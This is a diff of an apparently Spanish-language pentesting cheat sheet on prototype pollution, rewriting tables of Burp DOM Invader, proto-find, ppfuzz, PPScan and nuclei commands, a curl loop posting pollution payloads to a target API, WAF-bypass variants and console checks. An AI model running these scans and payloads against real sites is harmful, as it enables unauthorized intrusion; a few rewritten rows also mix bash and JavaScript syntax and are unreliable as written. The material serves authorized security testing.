@@ -25,16 +25,13 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Habilitar | Burp → DOM Invader → Enable + reload page | Built-in Burp Pro. |
-| Auto-detection PP sources | Detecta `__proto__`, `constructor.prototype` en JS | Activo while browsing. |
-| Auto-detection PP sinks | Detecta `eval`, `Function`, `setTimeout` con strings | Sinks reales. |
-| Source-to-sink trace | Trace de input controlado al sink | Path completo. |
-| Click-to-test | Auto-test con payload `{"polluted":"yes"}` | Testing rápido. |
-| Source filter | Filtrar por tipo: hash / search / postMessage / cookies | Focus específico. |
-| Custom source | Define source manual si no detecta auto | Edge cases. |
-| Inject payload | UI permite inject payload custom + observar resultado | Manual exploration. |
-| Stack tree exporter | Export findings para reporte | Save evidence. |
-| Combinable con DOM XSS | DOM Invader detecta XSS también | Two-for-one. |
+| Burp → DOM Invader → Enable + reload page | Setup + auto-detection sources/sinks | Burp Pro. |
+| DOM Invader UI → "Prototype Pollution" tab → click source | Auto-test con payload `{"polluted":"yes"}` | One-click testing. |
+| DOM Invader → "Inject" button con custom payload | Manual payload injection | Edge cases. |
+| DOM Invader → "Source tree" → trace source-to-sink | Path completo | Verification full flow. |
+| Browser console post-injection: `({}).polluted` | Confirm pollution global | Validation. |
+| DOM Invader → export findings | Save evidence reportable | Bug bounty. |
+| DOM Invader → "Augmented DOM" tab → ver props añadidas | Inspect prototype state | Post-attack analysis. |
 ^pp-tool-burp-dom
 
 ___
@@ -43,14 +40,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Repo | `https://github.com/kosmosec/proto-find` (ppmap evolved) | CLI scanner. |
-| Probe URL | `python ppmap.py -u https://target/` | Scan URL parameters. |
-| Multiple URLs | `python ppmap.py -l urls.txt` | Bulk. |
-| Custom params | `python ppmap.py -u "https://target/?a=1&b=2" --params a,b` | Specific. |
-| Output JSON | `--output findings.json` | Reportable. |
-| Verbose | `-v` debug | Stack traces. |
-| Threads | `-t 10` parallel | Speed. |
-| Combine con Burp Collaborator | Set Collaborator URL para OOB confirmation | Reliable detection. |
+| `git clone https://github.com/kosmosec/proto-find && cd proto-find` | Install ppmap (proto-find evolution) | Primera vez. |
+| `python proto-find.py -u https://target/` | Scan URL params para PP sources | Single URL. |
+| `python proto-find.py -l urls.txt -t 10` | Bulk scan threaded | Volume. |
+| `python proto-find.py -u https://target/ --output findings.json` | JSON output reportable | Post-scan. |
+| `python proto-find.py -u "https://target/?a=1&b=2"` | Auto-fuzz query params | Targeted. |
+| `python proto-find.py -u https://target/ --collaborator http://oast.fun` | OOB confirmation via Collaborator | Blind detection. |
 ^pp-tool-ppmap
 
 ___
@@ -59,20 +54,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| ppfuzz (Rust) | `git clone https://github.com/dwisiswant0/ppfuzz` | Fast Rust implementation. |
-| ppfuzz run | `ppfuzz -l urls.txt` | Bulk URL scan. |
-| ppfuzz custom payloads | `ppfuzz -l urls.txt -p custom-payloads.txt` | Custom set. |
-| PPScan (npm) | `npm install -g ppscan` | Node-based. |
-| PPScan run | `ppscan https://target/` | Default scan. |
-| Manual fuzz with curl | Loop sobre payloads | Lo-tech alt. |
-| ZAP plugin | OWASP ZAP tiene addon PP | Free option. |
-| `prototype-pollution-finder` (Burp) | Burp ext separate de DOM Invader | Older alternative. |
+| `cargo install ppfuzz` o `git clone https://github.com/dwisiswant0/ppfuzz` | Install ppfuzz Rust | Primera vez. |
+| `ppfuzz -l urls.txt` | Bulk URL scan PP | Volume testing. |
+| `ppfuzz -l urls.txt -p custom-payloads.txt` | Custom payload set | Targeted fuzzing. |
+| `ppfuzz -l urls.txt -c 50 -t 30` | 50 concurrent threads, 30s timeout | Speed. |
+| `npm install -g ppscan && ppscan https://target/` | PPScan alternativo Node | Sin Rust. |
+| `nuclei -t http/vulnerabilities/generic/prototype-pollution.yaml -u https://target/` | nuclei template PP | Auto-detect. |
+| Manual bash loop: `for p in $(cat payloads.txt); do curl -X POST -H "Content-Type: application/json" -d "$p" https://target/api/x; done` | Custom shell fuzz | Quick CLI. |
 ^pp-tool-scanners
 
 ### Manual fuzz con curl
 
 ```bash
-# Payloads PP comunes
 PAYLOADS=(
   '{"__proto__":{"polluted":"yes"}}'
   '{"constructor":{"prototype":{"polluted":"yes"}}}'
@@ -86,8 +79,7 @@ for p in "${PAYLOADS[@]}"; do
     -H "Content-Type: application/json" \
     -d "$p"
 
-  # Verify pollution
-  curl -s https://target/api/health | grep -i polluted && echo "VULN with: $p"
+  curl -s https://target/api/health | grep -i polluted && echo "[!] VULN with: $p"
 done
 ```
 
@@ -95,26 +87,25 @@ ___
 
 ## Custom Payloads y Wordlists
 
-| **Wordlist** | **Path / Repo** | **Uso** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PortSwigger PP labs payloads | https://portswigger.net/web-security/prototype-pollution | Lab-tested. |
-| PayloadsAllTheThings - PP | `PayloadsAllTheThings/Prototype Pollution/` | Comprehensive. |
-| HackTricks PP | https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution | Compiled. |
-| Server-side PP gadgets | `https://github.com/BlackFan/client-side-prototype-pollution` | Client-side mostly. |
-| Server-side PP repo | `https://github.com/y0urb0at/prototype-pollution-cheatsheet` | Server-side. |
-| `__proto__` variants | `__proto__`, `prototype`, `constructor.prototype`, etc | Filter bypass. |
-| Bracket / dot notation | `[__proto__][x]`, `__proto__.x`, `__proto__[x]` | Different parsers. |
-| URL-encoded variants | `%5F%5Fproto%5F%5F`, `%5f%5fproto%5f%5f` | WAF bypass. |
-| Unicode variants | `____proto____` (escape) | Edge bypass. |
+| Browser → https://portswigger.net/web-security/prototype-pollution | PortSwigger labs PP payloads | Lab reference. |
+| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/Prototype Pollution"` | PayloadsAllTheThings PP wordlist | Foundation. |
+| Browser → https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution | HackTricks reference | Lookup. |
+| `git clone https://github.com/BlackFan/client-side-prototype-pollution` | Client-side PP gadgets repo | Client-side focus. |
+| `git clone https://github.com/y0urb0at/prototype-pollution-cheatsheet` | Server-side gadgets | Server-side focus. |
+| Browser console probe: `for k in ['__proto__','constructor.prototype','__proto__.toString','constructor[prototype]']; do test...` | Variant exploration | Client testing. |
+| `cat <<EOF > pp-payloads.txt\n{"__proto__":{"x":"y"}}\n{"constructor":{"prototype":{"x":"y"}}}\n{"__proto__.x":"y"}\nEOF` | Custom wordlist | Tooling input. |
 ^pp-tool-payloads
 
-### Verificación rápida de pollution exitosa
+### Verificación rápida de pollution
 
 ```javascript
-// Browser console — después de pollute, verificar
-({}).polluted  // si retorna 'yes' → polución global
+// Browser console post-pollution
+({}).polluted        // si retorna 'yes' → polución global confirmed
+Object.prototype.polluted  // alternativa
 
-// Server-side equivalent
+// Server-side test (si tenés acceso):
 const test = {};
 console.log(test.polluted);  // si 'yes' → vulnerable
 ```
